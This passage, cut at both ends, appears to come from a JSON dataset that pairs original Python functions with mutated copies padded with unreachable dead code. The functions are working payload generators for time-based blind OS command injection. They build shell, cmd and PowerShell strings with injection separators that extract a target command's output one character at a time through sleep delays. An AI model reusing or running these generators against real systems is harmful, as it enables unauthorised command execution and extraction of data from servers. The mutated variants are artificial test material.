\"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\")' + separator + '[ ' + str(output_length) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(output_length) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(len(\\'$(echo $(' + cmd + '))\\'))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    },
    {
        "func_name": "get_char",
        "original": "def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + cmd + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
        "mutated": [
            "def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + cmd + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + cmd + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + cmd + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + cmd + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c ' + cmd + ')).trim()).substring(' + str(num_of_chars - 1) + ',1))\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'cmd=\"$(echo $(' + cmd + '))\"' + separator + 'char=$(expr substr \"$cmd\" ' + str(num_of_chars) + ' 1)' + separator + 'str=$(printf \\'%d\\' \"\\'$char\\'\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + cmd + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload"
        ]
    },
    {
        "func_name": "get_char_alter_shell",
        "original": "def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"import os; print(ord(os.popen(\\'' + cmd + \"').read().strip()[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"import os; print(ord(os.popen(\\'' + cmd + \"').read().strip()[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"import os; print(ord(os.popen(\\'' + cmd + \"').read().strip()[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"import os; print(ord(os.popen(\\'' + cmd + \"').read().strip()[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = 